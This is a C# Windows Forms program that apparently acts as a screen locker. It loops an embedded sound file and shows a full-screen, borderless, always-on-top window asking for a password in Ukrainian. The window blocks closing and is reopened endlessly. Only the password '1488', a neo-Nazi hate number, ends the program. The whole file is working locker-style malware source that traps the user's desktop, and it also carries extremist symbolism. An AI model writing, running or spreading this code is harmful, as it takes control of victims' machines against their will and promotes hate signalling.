using System;
using System.Drawing;
using System.Media;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace permalink
{
    static class Program
    {
        [STAThread]
        static async Task Main(string[] args)
        {
            var assembly = Assembly.GetExecutingAssembly();
            var stream = assembly.GetManifestResourceStream("permalink.bombardiro.wav");
            SoundPlayer player = new SoundPlayer(stream);

            Application.EnableVisualStyles();

            _ = Task.Run(async () =>
            {
                while (true)
                {
                    stream.Position = 0;
                    player.Play();
                    await Task.Delay(8000);
                }
            });

            while (true)
            {
                Application.Run(new ForceInputForm());
            }

        }
    }

    public class ForceInputForm : Form
    {
        private TextBox inputBox;
        private Button confirmButton;
        private bool confirmed = false;
        private Label counterLabel;

        public ForceInputForm()
        {
            this.Text = "Система";
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.Bounds = Screen.PrimaryScreen.Bounds;
            this.BackColor = Color.Black;

            var panel = new Panel
            {
                Width = 600,
                Height = 300,
                BackColor = Color.FromArgb(180, Color.White),
                Left = (this.ClientSize.Width - 600) / 2,
                Top = (this.ClientSize.Height - 300) / 2
            };
            panel.Anchor = AnchorStyles.None;

            Label label = new Label
            {
                Text = "Укажіть пароль:",
                AutoSize = false,
                TextAlign = ContentAlignment.MiddleCenter,
                Font = new Font("Segoe UI", 24, FontStyle.Bold),
                Dock = DockStyle.Top,
                Height = 80,
                ForeColor = Color.DarkRed,
                BackColor = Color.Transparent
            };

            inputBox = new TextBox
            {
                Font = new Font("Segoe UI", 18),
                Width = 400,
                Top = 100,
                Left = (panel.Width - 400) / 2
            };

            confirmButton = new Button
            {
                Text = "ПІДТВЕРДИТИ",
                Font = new Font("Segoe UI", 16, FontStyle.Bold),
                Width = 250,
                Height = 50,
                Top = 180,
                Left = (panel.Width - 250) / 2,
                BackColor = Color.DarkRed,
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            confirmButton.FlatAppearance.BorderSize = 0;
            confirmButton.Click += ConfirmButton_Click;

            panel.Controls.Add(label);
            panel.Controls.Add(inputBox);
            panel.Controls.Add(confirmButton);
            this.Controls.Add(panel);

            this.FormClosing += (s, e) =>
            {
                if (!confirmed)
                    e.Cancel = true;
            };

            this.Resize += (s, e) =>
            {
                panel.Left = (this.ClientSize.Width - panel.Width) / 2;
                panel.Top = (this.ClientSize.Height - panel.Height) / 2;
            };
        }

        private void ConfirmButton_Click(object sender, EventArgs e)
        {
            if (inputBox.Text == "1488")
            {
                Environment.Exit(0);
            }
            else if (!string.IsNullOrWhiteSpace(inputBox.Text))
            {
                confirmed = true;
                this.Close();
            }
            else
            {
                MessageBox.Show("Error password.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
    }
}